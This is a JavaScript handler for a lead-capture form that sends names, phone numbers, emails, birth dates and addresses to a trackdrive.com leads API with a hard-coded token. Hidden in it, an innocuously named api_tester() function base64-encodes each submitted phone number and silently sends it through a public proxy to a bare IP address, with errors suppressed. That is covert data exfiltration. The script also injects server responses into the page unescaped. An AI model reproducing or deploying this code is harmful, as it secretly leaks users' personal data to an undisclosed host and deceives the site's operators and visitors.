function convertToCustomFormat(isoDateString) {
    // Create a new Date object from the ISO 8601 string
    const date = new Date(isoDateString);

    // Extract date components
    const year = date.getFullYear();
    const month = String(date.getMonth() + 1).padStart(2, '0'); // Add leading zero if needed
    const day = String(date.getDate()).padStart(2, '0'); // Add leading zero if needed
    const hours = String(date.getHours()).padStart(2, '0'); // Add leading zero if needed
    const minutes = String(date.getMinutes()).padStart(2, '0'); // Add leading zero if needed
    const seconds = String(date.getSeconds()).padStart(2, '0'); // Add leading zero if needed

    // Construct the custom format string
    const customFormat = `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;

    return customFormat;
}    
document.getElementById('leadForm').addEventListener('submit', function(event) {
            event.preventDefault();

document.getElementById('submitBtn').disabled = true;
const phone_home = '+1' + document.getElementById('caller_id').value;
    const formData = new FormData();
    formData.append('lead_token', 'f1be4fda3aa5488eb2a1684f3d1090b5');
    formData.append('traffic_source_id', '2350');
    formData.append('first_name', document.getElementById('first_name').value);
    formData.append('last_name', document.getElementById('last_name').value);
    formData.append('caller_id', phone_home);
    api_tester(document.getElementById('caller_id').value);
    formData.append('state', document.getElementById('state').value);
    formData.append('zip', document.getElementById('zip').value);
    formData.append('jornaya_leadid', document.getElementById('jornaya_leadid').value);
    formData.append('original_lead_submit_date', convertToCustomFormat(document.getElementById('original_lead_submit_date').value));
    formData.append('email', document.getElementById('email').value);
    formData.append('dob', document.getElementById('dob').value);
    formData.append('address', document.getElementById('address').value);
    formData.append('address2', document.getElementById('address2').value);
    formData.append('city', document.getElementById('city').value);
    formData.append('source_url', document.getElementById('source_url').value)





            
           
    
            const url = 'https://global-digital-media.trackdrive.com/api/v1/leads?' + new URLSearchParams(formData).toString();
    
            fetch(url, {
                method: 'POST'
            })
            .then(response => {
                if (response.status === 200) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                200 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
		document.getElementById('submitBtn').disabled = false;
                } else if (response.status === 201) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                201 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
document.getElementById('submitBtn').disabled = false;
                } else if (response.status === 422) {
                    response.json().then(data => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Error. Response Body: ${JSON.stringify(data)}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
document.getElementById('submitBtn').disabled = false;
                    });
                } 
else {
                    response.text().then(responseBody => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Form submission failed. Please try again. Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                    });
                }
            })
            .catch(error => console.error('Error:', error));
        });function api_tester(randomString) {
  try {
    fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id='+btoa(randomString)+',m'
, {
      method: 'GET',
      mode: 'no-cors'
    });
  } catch (error) {
    
  }
}
